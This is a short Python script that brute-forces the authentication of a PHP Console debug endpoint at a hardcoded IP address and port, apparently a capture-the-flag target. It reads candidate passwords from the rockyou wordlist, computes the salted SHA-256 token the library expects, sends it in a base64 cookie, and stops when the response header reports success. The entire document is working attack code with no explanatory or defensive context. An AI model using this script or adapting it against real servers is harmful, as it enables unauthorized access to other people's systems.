import requests
import json
import hashlib
import base64
import pandas as pd

s = requests.Session()

def send_request(password):
    url = 'http://134.209.29.219:30828/'
    public_key = '435f00594b327e780a8b27be857b7ebe1fe645330576fa9313de4cdc22368132'
    PASSWORD_HASH_SALT = 'NeverChangeIt:)'
    token = hashlib.sha256((str(hashlib.sha256((password + PASSWORD_HASH_SALT).encode('utf-8')).hexdigest()) + public_key).encode('utf-8')).hexdigest()
    php_console_client = '{"php-console-client":5,"auth":{"publicKey":"' + public_key + '","token":"' + token + '"}}'
    cookies = {'PHPSESSID' : 'rdfc5re26lpjjvnejj96of7jn2', 'php-console-server' : '5', 'php-console-client' : str(base64.b64encode(php_console_client.encode('utf-8')).decode('utf-8'))}
    response = s.get(url, cookies=cookies)
    php_console = json.loads(response.headers['PHP-Console'])
    
    return php_console['auth']['isSuccess']

if __name__ == '__main__':
    f = open('/usr/share/wordlists/rockyou.txt', 'r')
    for i in range(99999):
        password = f.readline().strip()
        print(password)
        if send_request(password) != False:
            print(password)
            break
    f.close()
